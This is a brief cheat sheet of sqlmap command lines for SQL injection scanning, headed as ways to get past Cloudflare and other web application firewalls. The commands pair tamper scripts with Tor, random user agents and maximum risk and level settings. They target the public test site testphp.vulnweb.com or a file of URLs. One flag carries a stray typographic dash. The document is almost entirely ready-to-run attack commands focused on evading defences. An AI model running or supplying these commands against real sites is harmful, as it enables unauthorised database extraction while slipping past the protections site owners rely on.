<h1>SQLmap</h1>

### Cloudflare bypass tamper=space2comment,between,randomcase
```
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --batch --random-agent --risk=3 --level=5 --current-db --tamper=space2comment,between,randomcase --no-cast
```
### file based scan
```
sqlmap -m sqli_urls.txt --random-agent --batch --level=3 --risk=2 --current-db --tamper=space2comment,between,randomcase
```
### More waf bypass
```
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --tor --time-sec 20 -‐banner --delay 10 --tamper=space2comment,between,randomcase
```
